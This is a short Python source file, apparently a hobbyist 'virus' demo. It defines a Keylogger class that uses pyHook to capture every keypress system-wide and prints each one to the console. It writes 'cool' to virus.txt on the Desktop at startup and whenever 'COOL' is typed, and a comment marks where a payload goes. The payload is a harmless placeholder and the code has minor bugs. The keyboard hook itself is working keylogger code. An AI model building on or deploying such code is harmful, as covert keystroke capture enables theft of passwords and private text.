import sys, logging, pyHook, pythoncom, playsound, os


class Keylogger:
#the list which stores key presses. For simplicity, it only cares about the 4 most recent presses
    def __init__(self):
        self.keyLog = [0, 0, 0, 0]

    def payloadSound(self):
        playsound('cool.wav')

    def payloadFile(self, fileName):
        path = os.path.expanduser('~/Desktop')
        filePath = os.path.join(path,fileName)
        #print("File Path:",filePath)
        f = open(filePath,"a+")
        #print("File opened")
        f.write("cool\n")
        f.close()
        #print("Done")		


    def keyboardEvent(self, event):
            #this converts the key press into an ASCII character, so only ASCII gets put into our list
        press = chr(event.Ascii)

            #storage of the recent presses in the keyLog list for logic to activate payloads
        self.keyLog.pop(0)
        self.keyLog.append(press)

            #the logic that activates a payload
        if self.keyLog[0] == "C" and self.keyLog[1] == "O" and \
           self.keyLog[2] == "O" and self.keyLog[3] == "L":
                    #payload goes here
                print("cool")

                    #this code doesn't have an audio file yet
                '''payloadSound()'''

                self.payloadFile("virus.txt")



            #these two lines are so you can see what the keylogger is doing on the command prompt
        print(press)
        print(self.keyLog)

            #returning True means the function doesn't try and stick around: it goes to the next key press
        return True

#pyHook and pythoncom functions that catches when the user does something, for us, a keyboard press
def main():
    hooks_manager = pyHook.HookManager()
    virus = Keylogger()
    virus.payloadFile('virus.txt')
    hooks_manager.KeyDown = virus.keyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    main()
